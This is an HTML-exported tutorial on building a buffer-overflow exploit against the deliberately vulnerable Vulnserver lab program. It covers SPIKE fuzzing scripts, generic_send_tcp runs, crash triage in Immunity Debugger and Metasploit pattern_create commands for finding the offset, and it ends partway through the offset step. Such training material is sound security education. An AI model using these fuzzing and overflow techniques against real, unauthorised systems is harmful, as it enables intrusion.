<html >

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
</head>

<body lang=EN-AU link=blue vlink=purple style='tab-interval:.5in;word-wrap:
break-word'>

<div class=WordSection1>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal;mso-outline-level:1'><b><span style='font-size:16.0pt;
font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:#1E4E79;mso-font-kerning:18.0pt;mso-ansi-language:EN-AU'>BUFFER OVERFLOW
IN WINDOWS<o:p></o:p></span></b></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>The goal of this text is to explain
how to complete a buffer overflow (<span class=SpellE>BoF</span>) attack by
building a PoC in python and using it to figure out the final <span
class=SpellE>BoF</span> that let us exploit the vulnerable application.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>2 Great <span class=GramE>article</span>
explaining the process and how to use SPIKE:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l1 level1 lfo4;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>How spike
works: <a href="https://resources.infosecinstitute.com/topic/intro-to-fuzzing/">https://resources.infosecinstitute.com/topic/intro-to-fuzzing/</a><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l1 level1 lfo4;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>How to
automatise the process: <a
href="https://resources.infosecinstitute.com/topic/fuzzer-automation-with-spike/">https://resources.infosecinstitute.com/topic/fuzzer-automation-with-spike/</a><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l1 level1 lfo4;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Good
explanation: <a href="https://hex-men.tech/vulnserver_buffer_overflow/">https://hex-men.tech/vulnserver_buffer_overflow/</a><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>Here <span class=GramE>I'm</span>
going to explain the process to follow, but mainly the concepts we need to
understand to complete a <span class=SpellE>BoF</span> attack.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>I created the script
ExploitServerEIP.py that contains many of the required steps to be executed
from the client. Each part is commented ('''), so in order to run the phase 1
for example, we need to remove the ''' at the beginning and the end of the
section and keep the comments for the remaining phases.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>We need a Kali Linux / any Linux
used to run the scripts and to get the reverse shell once we have completed the
<span class=GramE>attack</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>We need a Windows system including
the <span class=SpellE>Vulnserver</span> (<a
href="http://sites.google.com/site/lupingreycorner/vulnserver.zip">http://sites.google.com/site/lupingreycorner/vulnserver.zip</a>)
and the Immunity debugger installed (<a
href="https://www.immunityinc.com/products/debugger/">https://www.immunityinc.com/products/debugger/</a>)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Process</span></b><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l13 level1 lfo6;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Start the
service / application you want to test in the server (windows). In this case we
are working with vulnserver.exe that runs in port 9999<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l13 level1 lfo6;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Start the
immunity debugger in the server and attach the vulnserver.exe application (File
/ Attach and select the vulnserver.exe process). Sometimes it is required to
hit <span class=SpellE>F9</span> to continue <span class=SpellE>runnning</span>
the process as normally it paused the execution. In the right-down corner the
debugger shows the process status (Running / Pause)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l13 level1 lfo6;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>In the
client (Kali), start Wireshark to capture the traffic to understand how the
information is send / <span class=GramE>received</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l13 level1 lfo6;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Start a
connection to the server and run some commands to understand how it works:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>nc</span></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'> -<span class=SpellE>nv</span> [IPWINDOWS] 9999<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>#In the answer the server indicates the use of HELP to
get additional info.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>#There are many commands we can execute HELP, STATS,
RTIME, LTIME, �<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l3 level1 lfo8;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Create a
SPIKE script to send the commands with fuzzed data. It is simple as if we
understand what information should be sent always and what we can manipulate,
the resulting script is like this:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><i><span style='font-size:10.0pt;font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>printf</span></i></span><i><span
style='font-size:10.0pt;font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>(&quot;HELP <span class=SpellE>0help.spk</span>
: &quot;); //print to terminal command and filename</span></i><span
style='font-size:10.0pt;font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><i><span style='font-size:10.0pt;font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>s_readline</span></i></span><i><span
style='font-size:10.0pt;font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>(); //print received line from <span
class=GramE>server</span></span></i><span style='font-size:10.0pt;font-family:
"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";mso-ansi-language:
EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><i><span style='font-size:10.0pt;font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>s_string</span></i></span><i><span
style='font-size:10.0pt;font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>(&quot;HELP &quot;); // send
&quot;HELP &quot; <b>command</b> to the program. Requires a space as the fuzz
will go after <span class=GramE>it</span></span></i><span style='font-size:
10.0pt;font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><i><span style='font-size:10.0pt;font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>s_string_variable</span></i></span><i><span
style='font-size:10.0pt;font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>(&quot;INJECTION_POINT&quot;);
//send fuzzed string. At the end, the resulting string sent to the server is
HELP INJECTION_POINT</span></i><span style='font-size:10.0pt;font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>#Create a <span class=SpellE>spk</span> file for each <span
class=GramE>commands</span> supported by the server: STATS, RTIME, etc. Assign
a sequence number to the filename so when it is restarted, it could continue
from the last tested and not from the beginning.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>#For each command wanted to be tested a separate SPIKE
script is required. If there are multiple fields in the same page or call to
the server, then they can be tested in one script. But different values in the
same field / command requires a script for each one.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l10 level1 lfo10;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Run the
SPIKE script to look for overflows:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>generic_send_tcp</span></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'> [<span class=SpellE>ip</span>] [port] [<span
class=SpellE>script.spk</span>] 0 <span class=GramE>0</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Spike send a predeterminate list of strings each time
replacing the string variable &quot;INJECTION_POINT&quot; by predetermined
injection chars already preconfigured in spike by default. The 0 indicates
where to start from the predetermined file and where to stop. To run all by
default use 0 0<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Check how the server goes in the debugger to identify any
issue / <span class=GramE>crash</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Continue playing with the scripts. <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>You can create a shell / wrapper file to call the <span
class=SpellE>generic_send_tcp</span> with each script. This shell should
identify when the server stops working.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:117.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l5 level1 lfo12;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>I used a <span
class=SpellE>perl</span> script called fuzzingall.pl copied from the article
but it can be a .<span class=SpellE>sh</span> <span class=GramE>file</span> <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:117.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l5 level1 lfo12;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Run it:
./fuzzingall.pl [<span class=SpellE>ip</span>] [port] 0 0 <span class=GramE>0</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:117.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l5 level1 lfo12;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>To start in
any specific (6):<span style='mso-spacerun:yes'>� </span>./fuzzingall.pl [<span
class=SpellE>ip</span>] [port] 6 0 0<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:81.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l12 level1 lfo14;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Identify
what is causing the <span class=GramE>crash</span></span></b><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Check the network capture and the scripts to validate
what input caused the server to crash. Restart the server and run the specific
call with the string that caused the BOF. <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>I created a python file with all the phases we need to
run (ExploirServerEIP.py). In this case, use the phase 1 to test this part.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Based on the identification of the command causing the
crash, try to use the content into the python script part 1 to validate it is
the right one. If putting the same information the server crash, then try to
identify the approximate length causing the crash with the script part 2.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:black;mso-color-alt:windowtext;background:#CCFFFF;mso-ansi-language:EN-AU'>The
most important part to have in mind is to identify if the crash <span
class=GramE>give</span> us a way to manipulate the memory registers. If so,
this means <b>we can inject a shellcode and make the program to go to the place
in memory where the shellcode is to exploit the server. </b></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>We need to identify what information is stored in each
register at the crash moment to see how <span class=GramE>can we</span>
manipulate the string we sent. This will let us build the exploit in the right
way.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:63.0pt;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l4 level1 lfo16;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Identify the
<span class=GramE>offset</span></span></b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Identify the exact size of the buffer<span
style='mso-spacerun:yes'>� </span>where the program crashes by creating <span
class=GramE>an</span> special string with <span class=SpellE>metasploit</span>
framework <span class=SpellE>pattern_create</span> (locate <span class=SpellE>pattern_create</span>).
In my case I had to run it in this way:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:black;mso-color-alt:windowtext;background:#CCFFCC;mso-ansi-language:EN-AU'>/opt/<span
class=SpellE>metasploit</span>-framework/embedded/bin/ruby
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l
<span class=GramE>5000</span></span><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:black;mso-color-alt:windowtext;background:#CCFFCC;mso-ansi-language:EN-AU'>In
other Kali: <span class=SpellE>msf-pattern_create</span> -l [LENGHT]</span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";color:black;mso-color-alt:windowtext;background:#CCFFCC;
mso-ansi-language:EN-AU'>msf-pattern_create</span></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:black;mso-color-alt:windowtext;background:#CCFFCC;mso-ansi-language:EN-AU'>
-l [LENGTH]</span><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
